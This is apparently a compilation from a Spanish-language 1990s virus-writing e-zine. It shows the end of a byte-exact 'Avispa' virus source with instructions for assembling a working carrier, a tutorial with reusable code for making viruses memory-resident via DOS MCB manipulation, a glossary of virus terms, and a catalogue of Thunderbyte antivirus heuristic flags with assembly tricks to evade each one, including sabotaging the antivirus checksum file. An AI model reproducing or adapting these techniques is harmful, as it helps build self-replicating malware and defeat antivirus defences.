	db  800h-(offset EndHoste-offset FakeHoste) DUP('a');
ends
end FakeHoste
; -------------------- Fake Hoste : Cut Here --------------------------------

NOTAS SOBRE EL SOURCE:
	El source dado mas arriba es una correspondencia byte-a-byte del
avispa en su "estado natural". Se ve que el autor uso para ensamblarlo el
A86 o algun otro engendro similar, ya que algunos jumps que podrian haber
sido SHORT (EB, 2 bytes) son NEAR (E9, 3 bytes). El TASM me los hacia SHORT,
asi que para mantener una correspondencia byte-a-byte, tuve que "forzarlos".
Ademas, en el ensamblado de este file, hay algunos bytes distintos debido a
que hay algunas instrucciones que realmente tienen dos codigos maquina
posibles:
			TASM 3.1	AVISPA ORIGINAL
	ADD AX, BX	03C3		01D8
	ADD DX, AX	03D0		01C2
	ADD SI, AX	03F0		01C6
	ADD DL, CL	02D1		00CA
	ADD AL, BL	02C3		00D8
	SUB CL, DL	2ACA		28D1
	MOV SP, AX	8BE0		89C4
	MOV AX, CX	8BC1		89C8
	MOV BX, DX	8BDA		89D3
	MOV DI, BX	8BFB		89DF
	MOV AH, AH	8AE4		88E4
	MOV ??, ??      8A??		88??
	MOV DL, DL	8AD2		88D2

INSTRUCCIONES PARA EL ENSAMBLADO:
	Para ensamblar el virus, pasar el source del avispa a AVISPA.ASM y
el del Fake Hoste a HOSTE.ASM. Luego seguir estos pasos.
	TASM /M5 AVISPA
	TLINK /T AVISPA
	TASM /M5 HOSTE
	TLINK /T HOSTE
	COPY /B HOSTE.COM+AVISPA.COM TMP
	DEL AVISPA.COM
	REN TMP AVISPA.COM
	Esto les va a dejar un AVISPA.COM que es carrier del AVISPA.
	Have fun!
						Trurl, the great constructorM‚todos de Residencia...
-------------------------------------------------------------------------------

	Este articulo intenta explicar los m‚todos mas usados de residencia, 
con un enfoque mas pr ctico que te¢rico, dejando en claro lo fundamental para
poder aprovecharlos, en especial el de MCB. Muestra ejemplos de los 2 tipos de 
t‚cnicas descritos, que pueden (en el caso del MCB) usarse directamente
en sus propios virus.
La teor¡a no esta muy detallada, pero se encontrar  todo lo necesario para
que el novato comprenda y pueda usar estos m‚todos. Y con la informaci¢n
del articulo, si desea profundizar la teor¡a, es solo cuesti¢n de leer alguna
guia o manual, que hable sobre la memoria, ya que aqu¡ se explica lo b sico
necesario (espero...).

Empezemos:
	Los m‚todos mas usados para dejar a un virus residente son: 
los que el DOS proporciona o el m‚todo de MCB (Memory Control Block).

La primera forma es la mas simple, pero tambi‚n la mas ineficaz,
primero porque le informa al dos que se esta dejando algo residente... ademas 
al ejecutarse esa funci¢n retorna el control al DOS. El programa que se 
intente ejecutar termina!. El virus que use esta t‚cnica para evitar salir 
al DOS en su instalacion en memoria tiene que reejecutarse. Para quedar 
residente, se ejecuta a si mismo otra vez (serv. 4bh), y en su segunda 
ejecuci¢n ejecuta una int 27h o llama al servicio 31 de la int. 21h, esta a su 
vez, le da en control al programa padre, al que se cargo primero, y este 
puede entonces terminar, ejecutando al anfitri¢n.  Si esto no se hiciera, al
ejecutar una int 21, por ejemplo, se le seder¡a el control al interprete de 
comandos...

Una de las caracter¡stica de los virus que usan esta t‚cnica es que
suelen colocarse al principio de los archivos, estos servicios dejaran
residente la cantidad de parraeo que se les indique desde el comienzo del
programa en memoria... Si tenemos un COM de 50K y el virus al final, al
usar la int 27h, y dejar residente, por ejemplo, 1k, lo que quedaria seria
el primer K del COM, no el virus que esta al final....
Es evidente que no pondemos dejar 50k  residentes... para que el virus quede
en memoria se puede relocar(mover), a otro bloque, tranferirle el control, y
luego este le sedera al control al programa padre...
Para evitar esto, muchos se colocan al principio del programa que infectan.
Claro que esto es lento, porque hay que leer todo el file, y luego escribirlo
despu‚s del virus, lo que no pasa si va al final, en ese caso solo hay que
escribir el virus, no el virus y el archivo!.
Este m‚todo es poco elegante, ademas de lento si se infecta dejando el virus
al comienzo, estro otras cosas...

Abajo, sigue un fuente de un TSR, no de un virus!, solo un TSR normal
para ilustrar su funcionamiento.
Este ejemplo intercepta la int. 21 y luego le pasa el control sin
hacer nada. Se le puede agregar el c¢digo para hacer lo que se quiera.

===============================================================================
===============================================================================
code    segment 
        assume cs:code,ds:code
        org   100h             
start:
	jmp	instalar			;Salta a la rutina de
						;instalacion.

;En esta variable va la direccion original de la int 21h.
old_21	dd	2

new_21:

;Aca va la rutina que se cuelga de la interrupcion 21h.

	jmp	cs:[old_21]			;Salta a la int original.

instalar:

;Obtengo el vector original de la int 21
	mov	ax, 3521h
	int	21h
	mov	word ptr old_21, bx	
	mov	word ptr old_21+2, es	

;Seteo el nuevo  vector de la int 21
        mov     ax,2521h          
   	push	cs
	pop	ds
        mov     dx, offset new_21
        int     21h

;Queda residente
	mov	ah, 31h
	mov	dx, 30d	 ;<--------- Cantidad de parrafeo(16 bytes) a dejar
	int 	21h	 ;	     residentes.	

code    ends
end	start
===============================================================================
===============================================================================

El segundo m‚todo es el de MCB, este es un poco mas complejo que simplemente
llamar a al int 27h, pero es mucho mas eficaz.
Para entender como funciona hay que saber que el dos crea un bloque de control
por cada bloque de memoria que use, este bloque de control, mide 16 bytes, un
parrafo y esta justo por escima  del bloque de memoria asignado.
En un .COM, por ejemplo, en  cs - 1, esta la direccion de este bloque. 
En el offset 3 del mismo esta la cantidad de memoria usada por ese 
programa..., para poder dejar residente un prog. hay que restarle a ese valor
la longitud del virus, luego liberar la memoria que ya no usa (servicio 4ah) y
asignarla (servicio 48h) a nuesto prog.
Para terminar, marcamos el MCB del segmento al que movimos nuestro virus con
'8' en el offset 1, para que el dos piense que es parte suya y no use esa
memoria. En ese offset se coloca una marca, para identificar al bloaque, para
esta rutina usamos 8 poruque es el que usa el DOS.

El c¢digo que sigue muestra como se hace...
Este code sirve para dejar un virus residente desde un COM, si se carga desde
un EXE hay que tener en cuanta que el segmento del MCB a modificar lo
obtenemos de restarle 1 a DS y no a CS.

===============================================================================
===============================================================================
;Paso a AX el Code Segment, lo decremento y paso a ES, para obtener
;la memoria reservada por el programa anfitri¢n (ES:[3]), que queda en AX...
	mov	ax, cs			;Con esto obtenemos el segmento
	dec	ax			;del MCB.

	mov	es, ax			;Aca estamos obteniendo del campo
	mov	ax, es:[3]		;del MCB, la memoria utilizada.

;Resto a la memoria  usada por el anfitri¢n la longitud del virus, el resultado
;en AX.
        sub     ax, bx                  ;En BX esta la longitud del virus,
					;en parrafos.

;Paso el resultado de la operacion anterior a BX,  para despu‚s llamar al
;servicio de liberar memoria, que se llama com BX, con el nuevo tama¤o y con
;el asegmento en ES.
	push	bx			;Salvo la cantidad de mem a reservar.
	mov	bx, ax			;Le paso la nueva cantidad a BX.
	push	cs 
	pop	es
	mov	ah, 4ah
	int	21h

;Asigno la memoria liberada a mi virus, el segmento de la memoria asignada 
;queda en AX. Decremento BX porque un parrafo lo va a user el DOS....
	pop	bx			;Popeo la  cantidad de mem a reservar.
	dec	bx
	mov	ah, 48h
	int	21h

;Decremento AX, y lo paso a ES, de esa forma apunto al parrafo que usa el DOS
;como control, marco ese parrfo en el offset 1 con 8, para que el DOS lo 
;considere como parte suya y no utilize esa zona de memoria.
;Despues incremento AX otra vez y lo paso a ES, para que ES quede apuntando
;a la memoria que el virus usara.
	dec	ax
	mov	es, ax
	mov	word ptr es:[1], 8
	mov	word ptr es:[8],'XX'           ;Opcional, un nombre al bloque.
	inc	ax
	mov	es, ax

	push	es			       ;Salvo la dir del seg. del virus

===============================================================================
===============================================================================

Ahora lo que queda es mover el  virus al segmento reservado, esto es cuesti¢n
de hacer un rep movsb al segmento al que apunta ES y listo, el virus esta
residente.

NOTA:
La rutina en si no hace saltar ninguna alarma, la alarma de residencia del TB
salta cuando detecta la actualizacion de la int 21h o 13h.

				Text by Zarathustra for Minotauro Magazine
Diccionario de Terminos y Expresiones de Virus #1...
-------------------------------------------------------------------------------

	La activa produccion de virus y los avances tecnicos que se han
logrado en este sentido, han fabricado toda una nueva terminologia, que para
el profano suena intrigante, misteriosa e incomprensible. Otros terminos
existen mas alla de los virus, pero han adquirido una nueva significacion
relativa a estos. Esto nos impulsa a producir un nuevo Diccionario de Terminos
y Expresiones de Virus. La confeccion de este diccionario corre a cuenta del
staff de Minotaur Magazine. Si se considera que hay algun termino que falte,
rogamos que se nos haga saber via mail en alguna de las BBS mencionadas en
el editorial. Lo mismo si se cree que alguna de las definiciones dadas es
incorrecta en algun sentido.
			    El Staff Permanente de Minotaur Magazine

Activacion: El "efecto" del virus. La mayoria de los virus de hecho no tienen
^^^^^^^^^^^ ningun efecto, y se limitan a reproducirse (utilizando a veces
	tecnicas de proteccion). Este "efecto" puede ser destructivo, tonto,
	gracioso, o cualquier otra cosa. Puede dispararse por datos del
	sistema, como fecha u hora, por la llamada a una determinada funcion
	del sistema, por el numero de infecciones, y un largo etcetera.

Anti-Debugging: Un conjunto de peque¤as tecnicas destinadas a dificultar al
^^^^^^^^^^^^^^^ maximo posible el debugging de un virus (o un programa). No son
	infalibles, aunque pueden dar algun que otro dolor de cabeza al que
	se ponga a estudiar el virus.

Anti-Dissasembly: Un grupo de tecnicas que tienen por objeto impedir que se
^^^^^^^^^^^^^^^^^ desensamble el virus mediante el uso de algun desensamblador,
	incluyendo en aquel, codigo para "confundirlo".

Background: Trasfondo. Se habla de background cuando un programa (o un virus),
^^^^^^^^^^^ se est  ejecutando "paralelamente" al programa ejecut ndose :
	Por ejemplo al DOS.

Boot Sector: El primer sector del disco. Contiene la BPB (Bios Parameter Block)
^^^^^^^^^^^^ una tabla referente al formato y tipo del disco, y un peque¤o pro_
	grama que es el encargado de Bootear (en discos de sistema) o del men_
	saje "Non-system disk or disk error" (en discos sin sistema). Ademas,
	si se trata de un disco duro, el primer sector del disco contiene una
	tabla de particion, que a su vez contiene los sectores en que se
	encuentran los boot sectors de cada una de las particiones del disco,
	ademas de otra informacion referente a ellas.

Bug: Error en un programa, que produce que este funcione mal. Tambien se
^^^^	aplica a los virus. (Un bug en un virus podria hacer, por ejemplo,
	que este infectara mal los EXEs y los destruyera, etc.)

Carrier: Asi llamado el file ejecutable generado al ensamblar el source
^^^^^^^^ original de un virus.

Cluster: Shit, como mierda definis un cluster?
^^^^^^^^
CMOS: Un tipo de memoria que sobrevive a los apagados de la maquina. Contiene
^^^^^	informacion de configuracion (ver Setup) como los tipos de disco,
	de monitor, etc. (Solo existe en ATs) Algunos virus (muy pocos) la
	cambian para invertir el orden de booteo (de A:;C: a C:;A:) e impedir
	que se bootee de un disco limpio.

Debugger: Un programa para estudiar el funcionamiento de otros programas.
^^^^^^^^^ (Tambien sirve para estudiar virus).

Directory Stealth: Una tecnica de ocultamiento que consiste en substraer el
^^^^^^^^^^^^^^^^^^ size del virus del size mostrado por el comando DIR de DOS.
	 (A los	virus que solo utilizan Dir-Stealth se los suele llamar semi_
	 stealth)

Disinfect-On-The-Fly: Una tecnica de (file) stealth que consiste en
^^^^^^^^^^^^^^^^^^^^^	directamente desinfectar el file cuando se considera
	que este va a ser inspeccionado (por ejemplo cuando es abierto). Suele
	ir acompa¤ada de Infection-On-Close (pues si no seria inefectivo).

Disassembler: Programa para producir c¢digo fuente en base a un ejecutable.
^^^^^^^^^^^^^
Disparador: Se llama disparador a la parte del codigo del virus que se encarga
^^^^^^^^^^^ de evaluar si se cumplen o no las condiciones para que el virus se
	active.

Fast Infector: Un tipo de virus que se distingue por la velocidad con la
^^^^^^^^^^^^^^ que se dispersa. Esto se logra infectando no solo cuando el file
	es corrido sino cada vez es accedido por algun medio (abierto, leido,
	etc.)

FAT: File Allocation Table. El "mapa" mediante el cual el DOS mantiene
^^^^	registro de que clusters estan usados y a que file pertenecen, etc.

File Stealth: En contraposicion a Dir-Stealth. Un virus que implementa
^^^^^^^^^^^^^ distintas tecnicas para pasar desapercibido, tecnicas mas avanza_
	das que el ocultamiento del size en el DIR.

Full Stealth: Un virus en el cual las tecnicas de stealth estan tan bien
^^^^^^^^^^^^^ implementadas e integradas que la existencia del virus pasa
	desapercibida cuando este esta activo en memoria. Se logra mediante
	la intercepcion de un monton de funciones del sistema, y hay stealth
	que son incluso indetectables a nivel de BIOS (via int 13h)

Generador de virus: Un programa para hacer virus. Para utilizarlo solo se
^^^^^^^^^^^^^^^^^^^ necesita un conocimiento muy basico del tema.

Hacked virus: Forma despectiva de "strain". (El autor es el unico con
^^^^^^^^^^^^^ derecho a hacer strains. Todas las otras variantes hechas por
	otras personas deberian ser llamadas hacks.)

Handle: El "sobrenombre" de un autor de virus. Suele tener resonancias
^^^^^^^	demoniacas o malignas, un sonido extra¤o, etc. A un autor de virus,
	o cualquier otro personaje del underground se lo conoce por este
	"handle", y su nombre verdadero no es del interes de nadie.

Header EXE: Una estructura que se encuentra al principio de todos los EXE, y
^^^^^^^^^^^ mediante la manipulacion de la cual los virus son capaces de
	infectarlo. Contiene informacion necesaria para correr el EXE.

Hoste: (s) Programa parasitado por el virus, programa infectado. (Ver
^^^^^^	Overwriting y Parasitico)

Infection-On-Close: Infectar al cerrar un archivo, en lugar de cuando este
^^^^^^^^^^^^^^^^^^^ es corrido.

Lammer: Insulto. Traducible a "Pendejo imbecil". Funciona bien con "asshole"
^^^^^^^	en ingles ("Lammer asshole") y el unico insulto castellano que
	encuentro para combinarlo es "pelotudo" ("Lammer pelotudo"), ya que
	otras combinaciones ("Lammer Forro", "Lammer boludo") no me
	convencen demasiado. Tambien en vocativos se suele usar el juego
	de palabras con el verbo castellano "lamer". ("Lammer veni lameme
	las bolas").

MCB: Memory Control Block. Una estructura de DOS para la alocacion de memoria,
^^^	que es manipulada por los virus para quedar residentes de una manera
	lo menos sospechosa posible. Los virus que utilizan esta tecnica
	para su alojamiento en memoria o bien disminuyen el size total
	reportado o bien son reconocibles por un ultimo bloque, perteneciente
	al "sistema" (en realidad del virus).

Multipartito (o multiparticion): Un virus que es simultaneamente de Boot y de
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ file. Suelen ser mas complejos que sus contra_
	partidos solo de file o solo de boot, y la interaccion entre la parte
	de boot y la de file suele ser compleja, y dar mejores resultados en el
	funcionamiento del virus.

New Header EXE: Ampliacion del header de los EXE comunes en los EXE de
^^^^^^^^^^^^^^^	Windows.

No-Residente: (a) Un virus en el que el proceso de infeccion es llevado
^^^^^^^^^^^^^ a cabo cuando el virus es corrido. Son menos efectivos que los
	residentes, y su funcionamiento impide realizar tecnicas de stealth.
	(Aun asi son considerados respetables, no como los overwriting, pues
	aun pueden tener un cierto grado de exito en su dispersion).

Overwriting: Un virus que al infectar destruye al programa infectado. Este
^^^^^^^^^^^^ tipo de virus no tiene mucha proyeccion, y se lo considera muy
	primitivo.

Parasitico: Un virus que conserva al programa infectado, para poder correrlo
^^^^^^^^^^^ luego como si no lo estuviera.

Payload: Ver "activaci¢n".
^^^^^^^^
Polimorfismo: Una tecnica de ocultamiento que apunta a que sea imposible
^^^^^^^^^^^^^ descubrir al virus mediante scanning, variando de tal forma el codigo
	de infeccion a infeccion que es imposible extraer una string. Esto se
	hace encriptando el codigo del virus y "variabilizando" la rutina de
	encripcion tanto como sea posible.

Residente: (a) Un virus que, cuando es corrido, se carga en memoria y
^^^^^^^^^^ a partir de ahi, queda en el background, hasta que es llamado a la
	superficie y alli infecta.

Root: Directorio Ra¡z, el primer directorio.
^^^^^
Runtime: (a) Ver Virus No-Residente
^^^^^^^^
Sector: Uno de los "pedazos" en que los discos estan divididos. Para el BIOS
^^^^^^^	los sectores son "fisicos" y se los referencia mediante 3 coordenadas;
	lado, pista, sector (lado 0, pista 0, sector 1, p.ej). El DOS utiliza
	sectores logicos, que son referenciados mediante un numero. (Sector 0)
	Y existe la correspondencia (lado 0, pista 0, sector 1 == Sector 0).

Setup: El famoso setup. Un programa cargado en la BIOS, desde donde se maneja
^^^^^^ la configuraci¢n del sistema (Por ejemplo la cantidad de sectores del 
	disco r¡gido, ¢ la fecha del sistema, etc).

SFT: System File Table. Una tabla con informacion referente a un file abierto.
^^^^	Se utiliza para todo tipo de propositos en los virus, ya que la
	informacion que contiene es muy variada y muy valiosa.

Stealth: Genericamente, se llama stealth a un virus que utiliza alguna tecnica
^^^^^^^^ para no ser notado. Existen varias de estas tecnicas.

Strain: Variante, sub-especie de un virus. Por lo general tiene algun tipo
^^^^^^^	de mejora con respecto a la original. Si no la tiene suele ser
	llamado "hack".

String: Cadena que se utiliza para reconocer un file infectado. Es una PARTE
^^^^^^^ del virus, NO todo el virus. Generalmente se hacen strings de las ruti_
	nas de infecci¢n. Al hacer virus polim¢rficos, se trata justamente de
	que no exista una cadena com£n entre infecci¢n e infecci¢n.

Toolkit: Una libreria para incluir en un virus, y conferirle a este la
^^^^^^^^ potencia de alguna tecnica avanzada como polimorfismo o tunneling.
	(Notese que no existen ni podran existir toolkits de stealth ya
	que este tipo de tecnicas estan muy ligadas al dise¤o general del
	virus, y no pueden ser "aisladas" en un toolkit).

Troyano: Programa especialmente hecho para causar da¤o. Se los suele confundir
^^^^^^^^ con los virus, aunque no tienen NADA que ver, excepto el hecho de que
	los troyanos hacen da¤o, y algunos virus hacen da¤o.

Tunneling: Una tecnica de proteccion, de tipo anti-anti-virus, que consiste
^^^^^^^^^^ basicamente en pasar "por debajo" de los antivirus residentes, que
	monitorean la actividad "rara". Se obtiene el address original de la
	int que se piensa puede estar monitoreada, y se usa este address
	para accederla.

Virus: (s) Un codigo ejecutable capaz de reproducirse a si mismo a traves de
^^^^^^	sistemas y computadoras. Se los clasifica primariamente por el tipo de
	reproduccion (Boot Sector, File, Cluster), y luego por la utilizacion
	de tecnicas de ocultamiento y proteccion (Stealth, Polimorfico, etc).

Virus de boot: Un tipo de virus. Se reproduce poniendose en el boot sector
^^^^^^^^^^^^^^ de los discos, y luego de haberse instalado en memoria, corre el
	boot sector original.

Virus de file: Este tipo de virus se reproduce infectando los files del disco.
^^^^^^^^^^^^^^ Se dividen en infectores de COM, de SYS, y de EXE. (y ultimamen_
	te de EXE de windows).

Virus de cluster: Un tipo de virus relativamente nuevo y oscuro. Para infectar
^^^^^^^^^^^^^^^^^ no modifica el file, sino sencillamente la entrada de direc_
	torio del archivo. Solo existe UN virus de este tipo, el celebre Dir-2.

Full Thunderbyte Stealth...
-------------------------------------------------------------------------------
   Lo que ac  tratamos de hacer, es enumerar TODOS los posibles flags del
Thunderbyte, cosa de que no les quede la duda si su virus va a hacer saltar una
alarma bajo una circunstancia espec¡fica. En definitiva, este texto es el mismo
que el del n£mero anterior, pero ahora mas completo.


Flag "B" - Back to entry point
------------------------------
   Este es el que indica cuando un prog. en alg£n lugar de todo su c¢digo, re_
   gresa al Entry Point, osea al principio... Para un COM ser¡a un salto al
   principio, osea al offset 100h:

	MOV	AX, 100h
	JMP	AX

   Y esto se caga de la misma forma...:

	PUSH	100h
	POP	AX
	JMP	AX

Flag "E" - Flexible entry point
-------------------------------
   Este es el que avisa cuando estamos calculando el offset actual, se acuer_
   dan ? Bueno, la forma cl sica ser¡a ‚sta:

	CALL	OBTENER_DIRECCION
OBTENER_DIRECCION:
	POP	BP
	SUB	BP, OFFSET OBTENER_DIRECCION

   Y la forma anti-tb ser¡a simulando ese POP:

	CALL	OBTENER_DIRECCION
OBTENER_DIRECCION:
	MOV	DI, SP
	MOV	BP, WORD PTR SS:[DI]
	SUB	BP, OFFSET OBTENER_DIRECCION
	INC	SP
	INC	SP

Flag "Z" - EXE/COM determination
--------------------------------
   Este es el culpable de la detecci¢n de muchos de los virus...en programaci¢n
   convencional no es de lo mas utilizado :-)
   Originalmente lo que hac¡amos era: leer los 2 primeros bytes del archivo, 
   tirarlos a un b£ffer, y comparar ese b£ffer con 'ZM' (ojo! con ZM y no con
   MZ debido al almacenamiento inverso de palabras).
   Por ejemplo (Suponiendo que ya tenemos los 2 primeros bytes en un b£ffer...)

	CMP	WORD PTR [BUFFER], 'ZM'
	JNE	NO_ES_EXE
	...
	...
	...

   Ahora bien... este es el procediemiento convencional.
   Pero otra forma de hacer esto, es por ejemplo, comparar byte x byte:

	CMP	BYTE PTR [BUFFER], 'M'		;<--- Ojo! Ac  no lo comparamos
						; con ZM porque estamos compa_
						; rando byte x byte, no todo el
						; word junto, entonces primero
						; lo comparo con M y despu‚s
						; con Z.
	JNE	NO_ES_EXE
	CMP	BYTE PTR [BUFFER+1], 'Z'
	JNE	NO_ES_EXE
	...					;<--- Si lleg¢ hasta ac , es
	...					; porque es un EXE.
	...

Flag "S" - Search for executables
---------------------------------
   Este es el que te deschava la rutina de b£squeda de ejecutables... para un
   no_residente, es impresindible, y por lo tanto impresindible su ocultamien_
   to. Lo que originalmente hac¡amos era buscar *.COM ¢ *.EXE en alg£n directo_
   rio, pero lo que podemos hacer es, en vez de buscar los *.COM ¢ *.EXE, bus_
   car los "*.C?M" ¢ "*.E?E", y despu‚s verificar si la letra del medio es una
   "O" ¢ una "E" respectivamente... por ejemplo:
   (Suponiendo que el nombre del file ya lo tenemos en una variable DTA_AREA)

;Verificar si es realmente un .COM y que no sea un .CAM o algo as¡...
;Para eso, muevo el puntero hasta el comienzo de la extensi¢n (buscando el pun_
;to en el filename) y lo incremento en 1, para que apunte a la letra del medio
;de la extensi¢n... que es la que nos interesa.
;Ahora busco el punto:

	MOV	CX, 13d				;13d es lo m ximo que puede me_
						;dir el filename.
	LEA	SI, DTA_AREA+1Eh		;1Eh es el desplazamiento del
						; filename en el area del DTA.
	LEA	DI, PUNTOS			;Puntos es una variable llena
						; de puntos (.)
	REPNE	CMPSB

;El punto lo tiene que encontrar s¡ o s¡, entonces incremento el puntero para
;que apunte al caracter del medio de la extensi¢n:

	INC	SI
	CMP	BYTE PTR [SI], 'O'
	JNE	NO_ES_COM
	...					;<--- Si lleg¢ hasta ac , es
	...					; porque es un COM real, y no
	...					; un CAM o algo as¡...


Flag "U" - Undocumented interrupt/DOS calls
-------------------------------------------
   Este se dispara cuando se hacen llamadas a servicios no_documentados, por
   ejemplo para desactivar el Vsafe...Para cagarlo se puede hacer lo mismo que
   antes: en vez de MOVer los valores, pasarlos por la pila y listo.

Flag "T" - Incorrect time stamp
-------------------------------
   El TB avisa de este problema cuando encuentra una fecha incorrecta, o impo_
   sible. Osea, un archivo que fue creado en el a¤o 2094 por ejemplo. Esto apa_
   rece generalmente en los archivos infectados por un stealh, y hace esto para
   comprobar infecci¢n, ya que si tiene que abrir todos los archivos para veri_
   ficar si ya est n infectados, ser¡a el virus mas lento del mundo. La forma
   tradicional es sumarle 100 o 200 al a¤o del archivo, cosa de que si se mira
   la fecha con un dir, o con otra cosa, muestre la misma fecha (que realmente
   es la misma, pero 100 a¤os mas adelante).
   Ejemplo:

	Nombre		Fecha real	Fecha que muestra el dir
	--------------------------------------------------------
	MEM.EXE		01/01/1994	01/01/94	;<-- Sin infectar
	MEM.EXE		01/01/2094	01/01/94	;<-- Infectado

Flag "M" - Memory resident code
-------------------------------
   Bueno, el TB avisa sobre este flag cuando encuentra que obtenemos y/¢ setea_
   mos los vectores de interrupci¢n. Una forma de cagarlo es la t¡pica. En vez
   de poner por ejemplo :

		MOV	AX, 3521H
		INT	21H

   Poner :

		PUSH	3521H
		POP	AX
		INT	21H

   Pero otra manera de hacer lo mismo es, en vez de ocultar el servicio, ocul_
   tar el VECTOR. El TB avisa que es c¢digo residente £nicamente con interrup_
   ci¢nes cr¡ticas, como por ejemplo la 13h ¢ la 21h. Osea que lo que podr¡amos
   hacer, es, en vez de decirle que obtenga un vector N, que obtenga un vector
   N-1 y despu‚s incrementarle 1.. Es solo un ejemplo :

		MOV	AX, 3521H
		INT	21H

   Cambiarlo por:

		MOV	AX, 3520H
		INC	AL
		INT	21H

Flag "L" - The prog. traps the loading of software
--------------------------------------------------
   Este flag se dispara en el momento que el TB se da cuenta de la t¡pica com_
   paraci¢n de verificar si es el servicio de ejecuci¢n de un file (4bh) una
   vez que hookeamos la 21h :

		CMP	AH, 4BH

   Para cagar esto, en vez de comparar AH con 4BH, podemos pasar el valor que
   vamos a comparar a otro lado y compararlo en otro registro, cosa de que no
   sea tan evidente para el TB que estamos comparando el servicio :

		XCHG	AH, AL		; Los XCHG son mas que nada para no mo_
		CMP	AL, 4BH		; dificar ning£n registro.
		XCHG	AH, AL		;

Flag "c" - No checksum data
---------------------------
   Este salta cuando el TB no encuentra el ANTI-VIR.DAT, que es un archivito
   que crea en cada directorio, donde guarda informaci¢n cr¡tica de cada pro_
   grama, como por ejemplo los primeros bytes de un COM y su tama¤o ¢ el Entry
   Point de un EXE y otras boludeces, adem s de guardar el CRC del archivo ori_
   ginal. En caso de que un archivo quede infectado, y siga existiendo el ANTI-
   VIR.DAT, el TB se da cuenta que el archivo fu‚ modificado y larga el cartel
   de alarma, y hasta puede llegar a limpiar el archivo infectado.

   O sea que lo que nos conviene es que este archivito no exista mas, o mejor,
   que no lo reconozca como archivo de checksum... Para esto, en vez de borrar_
   lo, lo que se puede hacer es modificar su header.. Con los primeros bytes es
   suficiente... En vez de que diga:"Thunderbyte...", sobreescribimos el header
   con basura...

   La ventaja de modificarlo en vez de borrarlo, es que se evita la posibilidad
   que se den cuenta que les falta ese archivo. De esta manera lo ven, pero
   est  al pedo ;-)

Flag "G" - Garbage instructions,
Flag "#" - Found an instruction decryption routine,
Flag "!" - Invalid opcode
--------------------------------------------------
   Esto es lo que marca cuando encuentra "basura" en el file... Esta pseudo_
   basura, es generalmente lo que queda luego de una encripci¢n... Al encrip_
   tar un virus, el c¢digo que queda (obviamente no ejecutable) puede ser toma_
   do como basura para el TB. Entonces el TB interpreta esa basura como un po_
   sible resultado de una encripci¢n, y dispara ese flag.
   Una posible soluci¢n es que el resultado de la encriptaci¢n no sea mayor que
   la instrucci¢n mas alta. Una forma de lograr esto es rotando 1 bit, o ha_
   ciendo alguna operacion que no se sarpe..
   Otra forma es haciendo un falso exit antes del c¢digo encriptado...Con esto
   el TB se cree que lo que sigue son datos del programa y no lo toma como ba_
   sura. Estructura:

	JMP	DECRYPT		;<ÄÄÄÄÄ Jump al virus
		...		;<ÄÄÄÄÄ Programa anfitri¢n

DECRYPT:	...		;<ÄÄÄÄÄ Rutina de desencripci¢n
	JMP	TE_CAGUE	;<ÄÄÄÄÄ Salto para no ejecutar la salida al DOS
		MOV	AH, 4Ch	;<ÄÂÄÄÄ C¢digo que no se ejecuta nunca
		INT	21h	;<ÄÙ
TE_CAGUE:
		...		;<ÄÄÄÄÄ Continuaci¢n de la rutina de desencrip.
		¨ÆA¬		;<ÄÄÄÄÄ Virus encriptado (basura)

   Ahora bien, como se tardo DEMASIADO en lanzar el segundo n£mero de la revis_
   ta, ahora el TB se da cuenta del JMP que est  antes de la salida al DOS.
   Pero bueno, eso no significa que nos va a cagar, no? NO! No nos va a cagar
   nada, porque lo que se puede hacer (gracias a la ingeniosidad de Leviathan,
   quien totalmente perturbado, porque el TB 6.20 le cagaba el Xou da Xuxa, se
   qued¢ toda una noche sin dormir y sac¢ la nueva versi¢n ANTI-TB 6.20 :) es
   hacer una llamada al DOS al pedo, como por ejemplo pedir la fecha. Con hacer
   una llamda no me refiero a CUALQUIER llamada, sino que cualquiera que no me
   destruya los registros de clave y dem s. El c¢digo quedar¡a de la siguiente
   manera :

	JMP	DECRYPT		;<ÄÄÄÄÄ Jump al virus
		...		;<ÄÄÄÄÄ Programa anfitri¢n

DECRYPT:	...		;<ÄÄÄÄÄ Rutina de desencripci¢n

	JMP	TE_CAGUE	;<ÄÄÄÄÄ Salto para no ejecutar la salida al DOS
		MOV	AH, 4Ch	;<ÄÂÄÄÄ C¢digo que no se ejecuta nunca
		INT	21h	;<ÄÙ
TE_CAGUE:
		MOV	AH, XXX	;<ÄÄÄÄÄ LLamada al pedo, pero que no estrop‚e
		INT	XX	;	nada.
		...		;<ÄÄÄÄÄ Continuaci¢n de la rutina de desencrip.

		¨ÆA¬		;<ÄÄÄÄÄ Virus encriptado (basura)

Flag "p" - Packed program
-------------------------
   Este en realidad no es un flag de alarma, es un flag al pedo que nos avisa
   que el archivo est  comprimido y que puede ser que en su interior contenga
   un virus.

Flag "F" - Suspicious file access
---------------------------------
   Este flag salta cuando el TB encuentra que el programa tiene c¢digo capaz de
   modificar los atributos de un file.. Se puede cagar de la misma forma que la
   mayor¡a: En vez de MOVer el valor del servicio en AH, PUSHearlo y POPearlo.

Flag "?" - Inconsistent EXE header
----------------------------------
   El TB nos avisa de este flag, cuando encuentra que en el header EXE hay in_
   formaci¢n incongruente.. Un ejemplo es que el header, en el campo donde
   guarda el tama¤o dle file, indica un valor, pero el file realmente ocupa
   mas.. Esto podr¡a ser causado por un programa que usa overlays, o por un vi_
   rus que calcula mal el nuevo tama¤o.

Flag "O" - Code that overwrites/moves a prog. in memory
-------------------------------------------------------
   Esto se produce por lo general cuando tratamos de restaurar los primeros
   bytes del Hoste en un COM. Por lo general hacemos:

	mov di, 100h
	lea si, [offset BYTES_ORIGINALES+bx]	;<- BX contiene off. del virus.
	movsb
	movsw

   (Ojo que esto se puede hacer de varias maneras distintas, pero, 
   basicamente, es como esta arriba).
   Aqui basta con reemplazar el MOV DI, 100 por un PUSH 100, POP DI.

Flag "A" - Suspicious memory allocation
---------------------------------------
   Esta flag es disparada por un codigo como este:
	mov ax, ds
	dec ax
	mov es, ax
	cmp byte ptr es:[0], 5ah
	mov ax, es:[3]
	mov dx, es
	add dx, ax
	... etc...
   (Como se ve, se esta tratando de hacer alguna manipuacion de los MCBs)
   Se lo puede cagar cambiando el valor 5A por otro, de esta manera:

	;en vez de ...
				cmp byte ptr es:[0], 5ah

	;poner
				inc byte ptr es:[0]
				cmp byte ptr es:[0], 5bh

   Modifica el valor del MCB, pero es la unica forma :-).

Flag "J" - Suspicious jump construct
------------------------------------
   Lo dispara una larga cadena de JMPs (al menos 2) a posiciones mas o menos
   lejanas entre si. Un ejemplo:

	Start:		JMP Continuar
			...
	Continuar:	JMP Virus
			...
